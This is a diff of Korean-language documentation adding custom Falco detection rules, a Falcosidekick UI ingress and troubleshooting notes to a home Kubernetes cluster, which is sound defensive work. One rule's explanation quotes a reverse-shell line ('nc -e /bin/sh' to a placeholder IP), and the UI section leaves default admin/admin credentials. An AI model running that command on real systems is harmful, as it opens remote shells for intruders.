@@ -283,27 +283,126 @@ kubectl top pods -n falco
 | Package management | apt/yum 실행 | Error |
 | Modify binary dirs | /bin, /sbin 수정 | Error |
 
-### 커스텀 룰 (예시)
+### 커스텀 룰 (blog-system 특화) ⭐
 
-**파일**: `/home/jimin/k8s-manifests/docs/helm/falco/values.yaml`
+> 2026-01-23 추가: blog-system namespace 맞춤형 보안 룰 4개
+
+**파일**: `/home/jimin/k8s-manifests/docs/helm/falco/values.yaml` (customRules 섹션)
+
+#### Rule 1: Java Process Spawning Shell (RCE 방어)
+
+**우선순위**: CRITICAL
+**목적**: Spring Boot(Java) 프로세스가 shell을 실행하면 RCE 공격 의심
+**탐지 시나리오**: Log4Shell, Spring4Shell 같은 취약점 악용
 
 ```yaml
-customRules:
-  blog-rules.yaml: |-
-    # blog-system에서 shell 실행 감지
-    - rule: Shell spawned in blog-system
-      desc: Detect shell spawned in blog-system namespace
-      condition: >
-        spawned_process and
-        shell_procs and
-        k8s.ns.name = "blog-system"
-      output: >
-        Shell spawned in blog-system
-        (user=%user.name command=%proc.cmdline
-         container=%container.name pod=%k8s.pod.name)
-      priority: WARNING
-      tags: [shell, blog-system]
+- rule: Java Process Spawning Shell
+  desc: Detect java process spawning a shell (Likely RCE attack like Log4Shell)
+  condition: >
+    spawned_process and
+    proc.pname exists and
+    proc.pname in (java, javac) and
+    proc.name in (bash, sh, ksh, zsh, dash) and
+    container
+  output: >
+    🚨 CRITICAL: Java 프로세스가 Shell을 실행했습니다 (RCE 공격 의심!)
+    (user=%user.name pod=%k8s.pod.name namespace=%k8s.ns.name
+     parent=%proc.pname cmd=%proc.cmdline container=%container.name)
+  priority: CRITICAL
+  tags: [maturity_stable, host, container, process, mitre_execution, T1059, rce, java]
 ```
+
+**정상 시나리오**: Java가 shell을 실행할 이유 없음 (0%)
+**악의적 시나리오**: 원격 코드 실행 공격
+
+#### Rule 2: Package Manager in Container (Immutability 위반)
+
+**우선순위**: WARNING
+**목적**: 운영 중 컨테이너에서 패키지 설치 감지 (불변성 원칙 위반)
+
+```yaml
+- rule: Launch Package Management Process in Container
+  desc: Package management process ran inside container (Immutability violation)
+  condition: >
+    spawned_process and
+    container and
+    proc.name in (apk, apt, apt-get, yum, rpm, dnf, pip, pip3, npm) and
+    not proc.pname in (package_mgmt_binaries)
+  output: >
+    ⚠️ WARNING: 컨테이너 내부에서 패키지 관리자가 실행되었습니다!
+    (user=%user.name pod=%k8s.pod.name namespace=%k8s.ns.name
+     cmd=%proc.cmdline container=%container.name)
+  priority: WARNING
+  tags: [maturity_stable, container, process, mitre_execution, T1059]
+```
+
+**정상 시나리오**: 빌드 시에만 패키지 설치, 런타임엔 절대 안 함
+**악의적 시나리오**: 해커가 공격 도구 설치 (netcat, nmap 등)
+
+**테스트 결과** (2026-01-23):
+```bash
+# 테스트 명령
+kubectl exec -n blog-system web-bdcdfd7bd-n6m64 -- apk update
+
+# Alert 발생 (01:33:17)
+⚠️ WARNING: 컨테이너 내부에서 패키지 관리자가 실행되었습니다!
+pod=web-bdcdfd7bd-n6m64 namespace=blog-system cmd=apk update
+```
+
+#### Rule 3: Write to Binary Directory (Drift Detection)
+
+**우선순위**: ERROR
+**목적**: 시스템 디렉토리에 파일 쓰기 시도 감지 (악성코드 설치)
+
+```yaml
+- rule: Write to Binary Dir
+  desc: Attempt to write to system binary directories
+  condition: >
+    open_write and
+    container and
+    (fd.name startswith /bin/ or
+     fd.name startswith /usr/bin/ or
+     fd.name startswith /sbin/ or
+     fd.name startswith /usr/sbin/)
+  output: >
+    🔴 ERROR: 바이너리 디렉토리에 쓰기 시도 감지!
+    (user=%user.name file=%fd.name pod=%k8s.pod.name
+     namespace=%k8s.ns.name cmd=%proc.cmdline container=%container.name)
+  priority: ERROR
+  tags: [maturity_stable, container, filesystem, mitre_persistence, T1543]
+```
+
+**정상 시나리오**: /bin, /usr/bin, /sbin은 읽기 전용
+**악의적 시나리오**: 백도어 바이너리 설치, rootkit 설치
+
+#### Rule 4: Unexpected Outbound Connection (Reverse Shell 방어)
+
+**우선순위**: NOTICE
+**목적**: 예상치 못한 외부 연결 감지 (C&C 서버 통신, 데이터 유출)
+
+```yaml
+- rule: Unexpected Outbound Connection
+  desc: Detect outbound connections to uncommon ports (potential C&C or reverse shell)
+  condition: >
+    outbound and
+    container and
+    fd.type in (ipv4, ipv6) and
+    not fd.lport in (80, 443, 8080, 3306, 53) and
+    not fd.sip in ("127.0.0.1", "::1") and
+    not proc.name in (curl, wget, git)
+  output: >
+    🔵 NOTICE: 예상치 못한 외부 연결 시도 감지
+    (connection=%fd.name lport=%fd.lport rport=%fd.rport
+     pod=%k8s.pod.name namespace=%k8s.ns.name
+     cmd=%proc.cmdline container=%container.name)
+  priority: NOTICE
+  tags: [maturity_incubating, container, network, mitre_exfiltration, T1041]
+```
+
+**정상 시나리오**: DB(3306), 내부 API(8080), HTTPS(443) 연결
+**악의적 시나리오**: 해커 C&C 서버로 역쉘 연결 (nc -e /bin/sh 1.2.3.4 4444)
+
+**주의**: 노이즈가 많을 수 있으니 초기엔 NOTICE로 설정, 튜닝 필요
 
 ---
 
@@ -531,6 +630,108 @@ Falcosidekick이 Loki로 전송할 때 사용하는 라벨:
 
 ---
 
+## Falcosidekick UI 접속
+
+> 2026-01-23 추가: Ingress를 통한 웹 UI 접속 설정
+
+### Ingress 설정
+
+**파일**: `/home/jimin/k8s-manifests/falco/falcosidekick-ui-ingress.yaml`
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: falcosidekick-ui-ingress
+  namespace: falco
+  annotations:
+    nginx.ingress.kubernetes.io/whitelist-source-range: "192.168.X.0/24"  # 내부 네트워크 대역
+    nginx.ingress.kubernetes.io/enable-real-ip: "true"
+    nginx.ingress.kubernetes.io/use-forwarded-headers: "true"
+spec:
+  ingressClassName: nginx
+  rules:
+  - host: falco.jiminhome.shop
+    http:
+      paths:
+      - path: /
+        pathType: Prefix
+        backend:
+          service:
+            name: falco-falcosidekick-ui
+            port:
+              number: 2802
+```
+
+**적용**:
+```bash
+kubectl apply -f /home/jimin/k8s-manifests/falco/falcosidekick-ui-ingress.yaml
+```
+
+### 접속 방법
+
+#### 방법 1: Ingress를 통한 접속 (권장)
+
+**URL**: http://falco.jiminhome.shop
+
+**Windows hosts 파일 설정** (`C:\Windows\System32\drivers\etc\hosts`):
+```
+192.168.X.200 falco.jiminhome.shop  # MetalLB LoadBalancer IP
+```
+
+**인증 정보**:
+- 기본 인증: Helm Chart 기본값 사용 (admin/admin)
+- 필요 시 values.yaml에서 변경 가능
+
+**보안**:
+- IP 화이트리스트: `192.168.X.0/24` (내부 네트워크만 접근 가능)
+- 외부 IP는 `403 Forbidden` 차단
+
+#### 방법 2: Port-forward (임시 접속)
+
+```bash
+kubectl port-forward -n falco svc/falco-falcosidekick-ui 2802:2802
+# 브라우저: http://localhost:2802
+```
+
+### UI 기능
+
+**DASHBOARD 탭**:
+- Alert 통계 그래프
+- Priority별 분포 (CRITICAL/WARNING/ERROR)
+- Rule별 Top 10
+- 시간대별 트렌드
+
+**EVENTS 탭**:
+- 실시간 Alert 목록
+- 필터링 (Priority, Rule, Hostname)
+- 검색 기능
+- 상세 정보 확인 (클릭)
+
+**INFO 탭**:
+- Falcosidekick 설정 확인
+- 출력 목적지 (Loki, Slack 등)
+- 버전 정보
+
+### UI 필터 사용 예시
+
+**특정 Priority만 보기**:
+```
+Priorities → Critical, Error, Warning 선택
+```
+
+**특정 Pod만 보기**:
+```
+Tags → k8s.pod.name → web-xxxxx 선택
+```
+
+**최근 1시간만 보기**:
+```
+Since → 1h 선택
+```
+
+---
+
 ## 향후 IPS 활성화
 
 ### IDS vs IPS
@@ -635,6 +836,59 @@ uname -r
 driver:
   kind: ebpf  # modern_ebpf → ebpf
 ```
+
+### 4. BuildKit Alert (False Positive)
+
+**증상**:
+```
+🚨 CRITICAL: Drop and execute new binary in container
+container_image=moby/buildkit
+rule="Drop and execute new binary in container"
+```
+
+**원인**: GitHub Actions에서 Docker 이미지 빌드 시 BuildKit이 컨테이너 내부에서 바이너리를 생성하고 실행
+
+**판단**: ✅ **정상 동작 (False Positive)**
+- BuildKit은 Docker 빌드 프로세스의 일부
+- `/check` 바이너리는 BuildKit 헬스체크용
+- 실제 공격이 아님
+
+**해결 방법** (선택 사항):
+1. **무시**: 이 Alert는 정상으로 간주하고 무시
+2. **룰 예외 추가**:
+```yaml
+customRules:
+  blog-rules.yaml: |-
+    - rule: Drop and execute new binary in container
+      append: true
+      exceptions:
+        - name: buildkit_binaries
+          fields:
+            - container_image
+          values:
+            - moby/buildkit
+```
+
+**권장**: BuildKit Alert는 정상 동작이므로 무시하거나, 예외 추가
+
+### 5. TTY 조건 이해 (Shell 탐지 안 됨)
+
+**증상**: `kubectl exec ... -- /bin/sh -c "echo test"` 명령이 탐지 안 됨
+
+**원인**: "Terminal shell in container" 룰의 조건에 `proc.tty != 0` 포함
+- TTY가 할당되어야만 탐지됨
+- `-it` 플래그 없이 실행하면 TTY가 할당되지 않음
+
+**해결**: `-it` 플래그 사용
+```bash
+# ❌ 탐지 안 됨
+kubectl exec pod-name -- /bin/sh -c "echo test"
+
+# ✅ 탐지됨
+kubectl exec -it pod-name -- /bin/sh
+```
+
+**이유**: 대부분의 실제 공격은 TTY를 할당하여 Interactive Shell을 사용하기 때문
 
 ---
 
